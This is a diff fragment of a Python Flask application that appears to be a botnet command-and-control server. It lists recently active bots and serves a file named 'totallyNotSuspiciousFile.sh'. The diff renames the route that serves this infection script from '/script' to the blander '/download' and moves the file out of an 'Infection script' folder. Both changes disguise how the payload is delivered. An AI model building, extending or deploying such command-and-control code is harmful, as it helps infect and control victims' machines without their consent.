@@ -51,15 +51,15 @@ def get_botnets():
     botnets = list(filter(lambda b: (time.time_ns() // 1_000_000) - b.last_seen < 60_000, botnets))
     return jsonpickle.encode(list(map(jsonpickle.encode, botnets)))
 
-@app.route('/script', methods=["GET"])
+@app.route('/download', methods=["GET"])
 def myscript():
-    path= "Infection script/totallyNotSuspiciousFile.sh"
+    path= "Shell_script/totallyNotSuspiciousFile.sh"
     return send_file(path)
 
 
 @app.route('/home')
 def home():
-    return render_template("index.html")
+    return render_template("page_web.html")
 
 
 if __name__ == '__main__':
